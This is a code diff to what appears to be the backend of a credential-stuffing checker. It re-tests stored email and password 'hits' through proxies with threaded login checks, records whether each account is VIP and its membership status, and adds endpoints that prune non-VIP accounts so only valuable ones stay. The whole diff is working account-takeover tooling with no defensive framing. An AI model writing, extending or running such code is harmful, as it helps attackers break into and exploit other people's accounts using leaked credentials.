@@ -24,6 +24,7 @@ from .db import (
     clear_saved_combos,
     count_saved_combos,
     delete_hits,
+    delete_non_vip_hits,
     delete_saved_combos,
     export_saved_combos_text,
     get_session,
@@ -283,14 +284,10 @@ async def remove_all_hits() -> dict[str, int]:
     return {"deleted": deleted}
 
 
-@app.post("/api/hits/recapture")
-async def recapture_hits() -> dict[str, Any]:
-    if worker.is_running():
-        raise HTTPException(409, "Stop the job before recapturing hits")
-
+def _run_hit_recapture() -> dict[str, Any]:
     hits = list_hits_for_recapture()
     if not hits:
-        return {"ok": True, "total": 0, "updated": 0, "failed": 0, "results": []}
+        return {"total": 0, "updated": 0, "failed": 0, "results": []}
 
     proxy_line = _first_proxy_line()
     parsed_proxy: str | None = None
@@ -300,12 +297,12 @@ async def recapture_hits() -> dict[str, Any]:
         except ValueError:
             parsed_proxy = None
 
-    threads = min(5, max(1, len(hits)))
+    threads = min(3, max(1, len(hits)))
 
     def recapture_one(hit: dict[str, Any]) -> dict[str, Any]:
         email = hit["email"]
         password = hit["password"]
-        result = check_account(email, password, proxy=parsed_proxy, timeout=45)
+        result = check_account(email, password, proxy=parsed_proxy, timeout=120)
         if result.status != "HIT":
             return {
                 "id": hit["id"],
@@ -322,6 +319,8 @@ async def recapture_hits() -> dict[str, Any]:
             "ok": True,
             "phone": result.data.get("phone"),
             "member_credits": result.data.get("member_credits"),
+            "is_vip": bool(result.data.get("is_vip")),
+            "membership_status": result.data.get("membership_status"),
         }
 
     results: list[dict[str, Any]] = []
@@ -333,11 +332,46 @@ async def recapture_hits() -> dict[str, Any]:
     updated = sum(1 for item in results if item.get("ok"))
     failed = len(results) - updated
     return {
-        "ok": failed == 0,
         "total": len(hits),
         "updated": updated,
         "failed": failed,
         "results": results,
+    }
+
+
+@app.post("/api/hits/recapture")
+async def recapture_hits() -> dict[str, Any]:
+    if worker.is_running():
+        raise HTTPException(409, "Stop the job before recapturing hits")
+
+    payload = _run_hit_recapture()
+    failed = payload["failed"]
+    return {
+        "ok": failed == 0,
+        **payload,
+    }
+
+
+@app.post("/api/hits/delete-non-vip")
+async def remove_non_vip_hits() -> dict[str, int]:
+    if worker.is_running():
+        raise HTTPException(409, "Stop the job before deleting hits")
+    deleted = delete_non_vip_hits()
+    return {"deleted": deleted}
+
+
+@app.post("/api/hits/recapture-vip")
+async def recapture_and_prune_non_vip() -> dict[str, Any]:
+    if worker.is_running():
+        raise HTTPException(409, "Stop the job before refreshing hits")
+
+    payload = _run_hit_recapture()
+    deleted = delete_non_vip_hits()
+    failed = payload["failed"]
+    return {
+        "ok": failed == 0,
+        "deleted_non_vip": deleted,
+        **payload,
     }
 
 
